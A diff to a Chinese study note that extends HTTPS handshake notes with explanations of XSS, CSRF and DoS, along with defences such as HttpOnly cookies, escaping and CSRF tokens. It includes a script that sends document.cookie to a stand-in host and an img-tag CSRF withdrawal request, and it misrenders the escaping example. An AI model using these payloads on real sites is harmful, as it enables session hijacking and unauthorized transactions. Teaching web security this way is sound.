@@ -210,7 +210,7 @@
 
 * ##### 服务端发送证书（公钥）给客户端
 
-  * 服务端接收Cipher后，和自己支持的加密算法进行比对，如果不符合，则断开连接。否则，服务端会把符合的算法和证书发给客户端，包括证书时间、证书日期、证书颁发的机构。
+  * 服务端接收Cipher后，和自己支持的加密算法进行比对，如果不符合，则断开连接。否则**，服务端会把符合的算法和证书发给客户端，包括证书时间、证书日期、证书颁发的机构。**
 
 * ##### 2.2.4- 2.2.5 客户端验证服务端的证书
 
@@ -273,5 +273,60 @@
 
     ![img](https://mmbiz.qpic.cn/mmbiz_png/libYRuvULTdVx8X5NPwkUl0kJzNPoo0jFW0icuPhVqHB0cJN5G3XBLibAAYLIGZ2vqO4OMHoC48oNHqItUCzzNgLQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)
 
-    
-  
+
+# [跨站脚本攻击（XSS）]([https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md](https://github.com/CyC2018/CS-Notes/blob/master/notes/攻击技术.md))
+
+* 跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 **HTML** 和 **JavaScript**。
+
+## 攻击原理
+
+```html
+<p><script>location.href="//domain.com/?c=" + document.cookie</script></p>
+```
+
+* 另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果浏览的这个论坛网站通过 Cookie 管理用户登录状态，那么攻击者就可以**通过这个 Cookie 登录被攻击者的账号**了。
+
+## [危害]([https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md](https://github.com/CyC2018/CS-Notes/blob/master/notes/攻击技术.md))
+
+- 窃取用户的 Cookie
+- 伪造虚假的输入表单骗取个人信息
+- 显示伪造的文章或者图片
+
+## [防范手段]([https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md](https://github.com/CyC2018/CS-Notes/blob/master/notes/攻击技术.md))
+
+* 设置 Cookie 为 HttpOnly
+  * 设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。
+
+* 过滤特殊字符
+  * 例如将 `<` 转义为 `<`，将 `>` 转义为 `>`，从而避免 HTML 和 Jascript 代码的运行。
+
+# [跨站请求伪造(CSRF)]([https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md](https://github.com/CyC2018/CS-Notes/blob/master/notes/攻击技术.md))
+
+* 跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段**欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作**（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。
+* XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。
+
+## 攻击原理
+
+* 一个恶意攻击者可以在另一个网站上放置如下代码：
+
+  ```html
+  <img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">。
+  ```
+  * 如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。
+  * 通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是欺骗用户浏览器，让其以用户的名义执行操作。
+
+## [防范手段]([https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md](https://github.com/CyC2018/CS-Notes/blob/master/notes/攻击技术.md))
+
+* 检查 Referer 首部字段
+  * Referer 首部字段位于 HTTP 报文中，**用于标识请求来源的地址**。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。
+  * 无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。
+* 添加校验 Token
+  * 在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。**例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数**。
+*  输入验证码
+  * 因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。
+
+# [拒绝服务攻击(DoS)]([https://github.com/CyC2018/CS-Notes/blob/master/notes/%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF.md](https://github.com/CyC2018/CS-Notes/blob/master/notes/攻击技术.md))
+
+* 拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。
+
+* 分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。
